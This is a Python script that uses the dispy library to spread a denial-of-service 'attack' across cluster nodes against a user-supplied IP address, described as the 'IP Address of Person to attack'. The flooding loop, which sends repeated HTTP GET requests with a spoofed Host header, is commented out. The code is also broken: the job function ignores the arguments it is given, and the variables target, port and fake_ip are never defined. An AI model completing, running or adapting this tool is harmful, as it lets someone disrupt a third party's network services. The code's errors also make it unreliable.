
# 'compute' is distributed to each node running 'dispynode'
def attack():
    from time import perf_counter
    start = perf_counter()
    # while True:
    #     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #     s.connect((target, port))
    #     s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
    #     s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    #
    #     global attack_num
    #     attack_num += 1
    #     print(attack_num)
    #
    #     s.close()
    end = perf_counter()
    return start, end, end - start


# dispy calls this function to indicate change in job status
def job_callback(job): # executed at the client
    pass


# main 
if __name__ == '__main__':
    import dispy, argparse, logging, socket, sys, os
    import dispy.httpd

    server_nodes = ['10.0.0.13', '10.0.0.14']#, '10.0.0.20', '10.0.0.21']

    parser = argparse.ArgumentParser()
    parser.add_argument("ip_addr_to_attack", type=str, help="IP Address of Person to attack")
    parser.add_argument("attack_length", type =int, help="Length of Attack")
    args = parser.parse_args()

    ip_addr_to_attack = args.ip_addr_to_attack
    attack_length = args.attack_length

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    cluster = dispy.JobCluster(attack, ip_addr=s.getsockname()[0], nodes=server_nodes, callback=job_callback, loglevel=logging.INFO)
    # View Job Progress @ https://{master}:8181
    http_server = dispy.httpd.DispyHTTPServer(cluster)

    print(('Submitting attack of %s for %i seconds each to %s' % (ip_addr_to_attack, attack_length, server_nodes)))
    jobs = []
    for i in range(len(server_nodes)):

        job = cluster.submit(ip_addr_to_attack, attack_length)
        job.id = i
        jobs.append(job)
    cluster.wait()

    for job in jobs:
        start, end, duration = job()
        print('Attack Executed on %s for %i seconds' % (ip_addr_to_attack, duration))
    cluster.print_status()
    cluster.close()
